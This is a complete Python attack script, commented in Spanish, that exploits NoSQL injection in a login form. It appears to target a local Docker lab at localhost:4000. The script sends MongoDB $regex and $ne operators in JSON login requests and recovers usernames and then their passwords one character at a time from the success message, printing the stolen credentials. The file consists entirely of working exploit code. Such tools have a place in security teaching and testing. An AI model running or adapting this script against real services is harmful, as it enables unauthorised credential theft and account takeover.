#!/usr/bin/python3

from pwn import log
import requests, sys, signal


def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, def_handler)

class MakeNoSQLI():
    def __init__(self):
        print("""
 ____  _____          ______     ___      _____     _____   
|_   \|_   _|       .' ____ \  .'   `.   |_   _|   |_   _|  
  |   \ | |   .--.  | (___ \_|/  .-.  \    | |       | |    
  | |\ \| | / .'`\ \ _.____`. | |   | |    | |   _   | |    
 _| |_\   |_| \__. || \____) |\  `-'  \_  _| |__/ | _| |_   
|_____|\____|'.__.'  \______.' `.___.\__||________||_____|  
                                                            

              """)
        self.login_url = "http://localhost:4000/user/login" # URL de docker
        self.succes = "Logged in as user" # Poner acá lo que determina si se logró ingresar o no

        self.usernames = [] # Acá se guardarán los usernames encontrados
        self.passwords = [] # Acá se guardarán las passwords encontradas

        lower_case = "abcdefghijklmnñopqrstuvwxyz"
        upper_case = "ABCDEFGHIJKLMNÑOPQRSTUVWXYZ"
        digits = "1234567890"
        symbols = "°|¬!\"#$%&/()=?'\\¡¿¨´*+~[{^]}`;,:._-"
        self.original_characters = lower_case + upper_case + digits # Diccionario para fuerza bruta

        self.p1 = log.progress("Petición") # La petición enviada
        self.p2 = log.progress("Username Manipulation") # Se muestra como se va recortando el username
        self.p3 = log.progress("Deleted Character") # Último caracter eliminado
        self.p4 = log.progress("Dictionary") # Diccionario con el que se trabaja

        print()

        self.p5 = log.progress("Fuerza Bruta Username") # Muestra el username que se va encontrando
        self.p6 = log.progress("Fuerza Bruta Password") # Muestra la password que se va encontrando
        self.p7 = log.progress("Usernames Encontrados") # Muestra en una lista los usernames encontrados
        self.p8 = log.progress("Passwords Encontradas") # Muestra en una lista las passwords encontradas

        print()

        self.p9 = log.progress("Clean Credentials") # Muestra un output limpio de las credenciales
    
    def reorganizeCharacters(self, letter): # Reorganiza para optimizar caracteres
        characters = self.original_characters

        if letter not in characters or letter == None:
            characters = self.original_characters # Reestablecemos la cadena
            return characters  # La letra no está en la cadena o se necesita la cadena original, no hay cambios necesarios

        indice_letra = characters.index(letter)  # Obtenemos el índice de la letra en la cadena
        characters = characters[indice_letra + 1:]  # Tomamos la subcadena desde la letra y sin contarla a ella

        return characters

    def request(self, word, character, type, username=None): # Esto define si se busca un username o una password
        if type == "username":
            post_data = '{"username":{"$regex": "^%s%s"},"password":{"$ne": null}}' % (word, character) # Petición por Post
            headers = {'Content-Type': 'application/json'} # Formato de la data
            r = requests.post(self.login_url, headers=headers, data=post_data) # Se envía la data
            self.p5.status(word + character)

        elif type == "password":
            post_data = '{"username":"%s","password":{"$regex": "^%s%s"}}' % (username, word, character) # Petición por Post
            headers = {'Content-Type': 'application/json'} # Formato de la data
            r = requests.post(self.login_url, headers=headers, data=post_data) # Se envía la data
            self.p6.status(word + character)
        
        self.p1.status(post_data) # Actualiza info

        return r

    def usernameBruteForce(self, initial_username="", characters=None):
        # En el parámetro username se guardarán las coincidencias encontradas
        self.username = initial_username # Esto es para globalizar la variable y facilitar su manipulación

        # El parámetro characters almacenará el abecedario con el que se trabajará
        if characters is None:
            characters = self.original_characters # Comprobar si esto es necesario

        repetitions = 0 # Esto controla que la busqueda no siga indefinidamente si no se encuentran coincidencias

        while repetitions <= len(characters):
            for character in characters:
                self.p4.status(characters) # Actualiza info

                r = self.request(self.username, character, "username") # Petición por POST para username
                
                if self.succes in r.text: # Si el inicio de sesión fue exitoso
                    self.username += character # Se guarda el caracter exitoso
                    repetitions = 0 # Se resetea el contador por cada caracter correcto
                    characters = self.original_characters ##### Se reestablece el diccionario (útil cuando buscamos caracteres en reversa) (Revisar si tiene que ser puesto en el condicional "if len(self.usernames) >=1")
                    break # Este hace que se parta desde el inicio de la lista de caracteres luego de una coincidencia
                else:
                    repetitions += 1 # Se suma 1 por cada caracter incorrecto

                if repetitions == len(characters) and len(characters) == len(self.original_characters):
                    self.usernames.append(self.username) # Se añade el username  a la lista
                    self.p2.status("") # Se limpia el output
                    self.p3.status("") # Se limpia el output
                    self.p5.status(self.username) # Se muestra el último username encontrado
                    self.p7.status(self.usernames) # Se muestran los usernames encontrados
                    self.passwordBruteForce() # Se busca la contraseña para ese username
        
        if len(self.usernames) >=1: # Esto es para cuando ya se haya encontrado un username
            # Guardando el caracter
            deleted_character = self.username[-1]
            self.p3.status(deleted_character)

            # Borrando el último caracter
            self.username = self.username[:-1]
            self.p2.status(self.username)

            # Reorganizando el diccionario para buscar desde el caracter eliminado
            characters = self.reorganizeCharacters(deleted_character)
            self.p4.status(characters)

            if characters == "": # Si nos quedamos sin caracteres no hay que buscar más en esa posición
                # Guardando el caracter eliminado
                deleted_character = self.username[-1]
                self.p3.status(deleted_character)

                # Borrando el último caracter
                self.username = self.username[:-1]
                self.p2.status(self.username)

                # Reorganizando el diccionario para buscar desde el caracter eliminado
                characters = self.reorganizeCharacters(deleted_character)
                self.p4.status(characters)
            try:
                self.usernameBruteForce(self.username, characters) # Busca usuarios
            except:
                sys.exit(0) # Salta un error cuando no hay más usuarios, esto finaliza el programa cuando pasa eso
    
    def passwordBruteForce(self):
        password = "" # Guardamos la password acá
        repetitions = 0 # Variable que controla el fin del bucle
        self.p6.status(password)

        while repetitions <= len(self.original_characters):
            for character in self.original_characters + "a": ##### (revisar si es necesario acortando el diccionario base a la letra más alta de una password y ver si el flujo del programa no se ve afectado)
                r = self.request(password, character, "password", self.username)

                if self.succes in r.text: # Si se inició sesión
                    password += character # Se guarda el caracter
                    self.p6.status(password)
                    repetitions = 0 # Se reestablece el contador
                    break
                else:
                    repetitions +=1 # Si no se inició sesión el contador aumenta
            
            if repetitions == len(self.original_characters) + 1: # Si se pasó por todo el diccionario sin exito
                self.passwords.append(password) # Se guarda la password
                self.p6.status("")
                self.p8.status(self.passwords)
                print(f"Creds {len(self.usernames)}.- {self.username}:|:{password}") # output bonito


if __name__ == "__main__":
    makeNoSQLI = MakeNoSQLI()
    makeNoSQLI.usernameBruteForce()
    sys.exit(0)
